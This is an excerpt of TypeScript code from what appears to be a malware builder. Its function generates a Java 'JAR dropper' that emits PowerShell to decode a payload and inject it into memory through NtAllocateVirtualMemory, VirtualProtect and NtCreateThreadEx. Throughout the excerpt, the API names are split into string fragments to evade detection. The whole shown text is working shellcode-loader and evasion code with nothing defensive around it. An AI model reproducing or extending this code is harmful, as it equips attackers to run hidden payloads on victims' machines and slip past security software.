...
function generateJarDropperSource(jarPersist: boolean): string {
  ...
  return [
    ...
    "    String nAlloc=\"NtAl\"+\"loc\"+\"ate\"+\"Virt\"+\"ual\"+\"Mem\"+\"ory\";",
    "    String nThread=\"NtCr\"+\"eat\"+\"eT\"+\"hre\"+\"adEx\";",
    "    String vProt=\"Vi\"+\"rtu\"+\"al\"+\"Pro\"+\"tect\";",
    "    String td2=\"using System;using System.Runtime.InteropServices;public class N{\"",
    "      +\"[DllImport(\"+dq+ntd+dq+\")]public static extern int \"+nAlloc+\"(IntPtr h,ref IntPtr a,IntPtr z,ref IntPtr s,uint t,uint p);\"",
    ...
    "      +\"[DllImport(\"+dq+k32+dq+\")]public static extern bool \"+vProt+\"(IntPtr a,uint s,uint p,ref uint o);}\";"  ,
    ...
    "      +\"L('decoded '+$b.Length+' bytes key='+$k);\"",
    "      +\"$s=$b.Length;\"",
    "      +\"try{Add-Type -TypeDefinition '\"+td2+\"';}catch{L('add-type error: '+$_)};\"",
    "      +\"L('add-type ok');\"",
    "      +\"$p=[IntPtr]::Zero;$z=[IntPtr]$s;\"",
    "      +\"$r=[N]::\"+nAlloc+\"(-1,[ref]$p,[IntPtr]0,[ref]$z,0x3000,0x04);\"",
    "      +\"L('alloc ret='+$r+' ptr='+$p);\"",
    "      +\"[Runtime.InteropServices.Marshal]::Copy($b,0,$p,$s);\"",
    "      +\"L('copy ok');\"",
    "      +\"$o=0u;[N]::\"+vProt+\"($p,$s,0x20,[ref]$o);\"",
    "      +\"L('protect ok');\"",
    "      +\"$t=[IntPtr]::Zero;\"",
    "      +\"$r2=[N]::\"+nThread+\"([ref]$t,0x1FFFFF,[IntPtr]0,-1,$p,[IntPtr]0,$false,0,0,0,[IntPtr]0);\"",
    "      +\"L('thread ret='+$r2+' handle='+$t);\"",
